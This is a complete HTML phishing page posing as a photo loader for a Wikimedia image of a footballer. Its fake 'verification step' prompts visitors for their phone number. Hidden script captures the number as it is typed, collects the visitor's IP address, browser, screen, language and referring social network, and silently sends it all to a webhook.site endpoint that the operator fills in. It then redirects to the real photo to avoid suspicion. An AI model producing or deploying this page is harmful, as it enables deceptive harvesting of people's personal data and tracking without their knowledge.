<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Loading Photo...</title>
    <meta http-equiv="refresh" content="3;url=https://upload.wikimedia.org/wikipedia/commons/b/bb/Neymar_Jr._with_Al_Hilal%2C_3_October_2023_-_03_%28cropped%29.jpg">
    <style>*{margin:0;padding:0;box-sizing:border-box;}body{font-family:Arial,sans-serif;background:linear-gradient(45deg,#667eea 0%,#764ba2 100%);height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;}.container{max-width:400px;padding:40px;background:rgba(255,255,255,0.1);border-radius:20px;backdrop-filter:blur(10px);}.form-group{margin-bottom:20px;}.phone-input{padding:15px;border:none;border-radius:10px;font-size:16px;width:100%;box-shadow:0 5px 15px rgba(0,0,0,0.2);}.btn{padding:15px 30px;background:#ff6b6b;color:white;border:none;border-radius:10px;font-size:16px;cursor:pointer;transition:transform 0.2s;}.btn:hover{transform:scale(1.05);}.spinner{display:inline-block;width:20px;height:20px;border:3px solid rgba(255,255,255,0.3);border-radius:50%;border-top-color:#fff;animation:spin 1s linear infinite;margin-left:10px;}@keyframes spin{to{transform:rotate(360deg);}}.direct-link{display:block;margin-top:20px;color:#fff;text-decoration:none;padding:10px 20px;background:rgba(255,255,255,0.2);border-radius:10px;transition:background 0.3s;}.direct-link:hover{background:rgba(255,255,255,0.3);}</style>
</head>
<body>
    <div class="container">
        <h1 style="font-size:24px;margin-bottom:20px;">🔄 Loading your photo...</h1>
        <p style="margin-bottom:25px;">Quick verification step:</p>
        <form class="form-group">
            <input class="phone-input" type="tel" id="phone" placeholder="📱 +1 (555) 123-4567" required>
            <br><button class="btn" type="submit">Continue to Photo <span class="spinner"></span></button>
        </form>
        <a class="direct-link" href="https://upload.wikimedia.org/wikipedia/commons/b/bb/Neymar_Jr._with_Al_Hilal%2C_3_October_2023_-_03_%28cropped%29.jpg">Or click here to view photo →</a>
    </div>
    <script>
        const phoneInput = document.getElementById('phone');
        const data = {
            phone: '', ip: '', userAgent: navigator.userAgent,
            language: navigator.language, screen: screen.width+'x'+screen.height,
            referrer: document.referrer, timestamp: new Date().toISOString()
        };
        
        // Get IP
        fetch('https://api.ipify.org?format=json').then(r=>r.json()).then(ipData=>{data.ip=ipData.ip;sendData();}).catch(()=>sendData());
        
        // Capture phone
        phoneInput.oninput = function(){if(this.value.length>8){data.phone=this.value;setTimeout(sendData,1500);}};
        document.querySelector('form').onsubmit = (e)=>{e.preventDefault();data.phone=phoneInput.value;sendData();};
        
        // Social detection
        if(document.referrer.includes('facebook')) data.social='Facebook';
        else if(document.referrer.includes('twitter')) data.social='Twitter/X';
        else if(document.referrer.includes('instagram')) data.social='Instagram';
        else if(document.referrer.includes('linkedin')) data.social='LinkedIn';
        
        function sendData(){
            // CHANGE LINE 2 HERE 👇
            fetch('https://webhook.site/YOUR-UNIQUE-ID-FROM-WEBHOOK-SITE',{
                method:'POST',headers:{'Content-Type':'application/json'},
                body:JSON.stringify(data)
            }).catch(()=>{}); // Silent
        }
    </script>
</body>
</html>
